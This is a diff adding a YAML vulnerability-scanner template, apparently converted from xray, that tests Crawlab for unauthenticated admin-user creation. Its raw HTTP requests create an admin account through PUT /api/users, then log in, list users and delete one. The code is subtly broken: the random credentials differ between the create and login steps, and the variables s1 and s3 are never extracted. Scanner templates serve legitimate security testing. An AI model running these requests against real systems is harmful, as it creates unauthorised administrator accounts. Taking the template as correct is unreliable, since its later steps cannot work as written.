@@ -1,0 +1,59 @@
+id: poc-yaml-crawlab-users-add
+
+info:
+  name: poc-yaml-crawlab-users-add
+  author: xiaobaicai
+  severity: high
+  tags: xray-converted,ct-456787
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/Crawlab/Crawlab%20users%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        PUT /api/users HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{rand_int(1000, 9999)}}","password":"{{rand_int(1000, 9999)}}","role":"admin","email":"{{rand_int(1000, 9999)}}@qq.com"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{rand_int(1000, 9999)}}","password":"{{rand_int(1000, 9999)}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /api/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{s1}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        DELETE /api/users/{{s3}} HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{s1}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
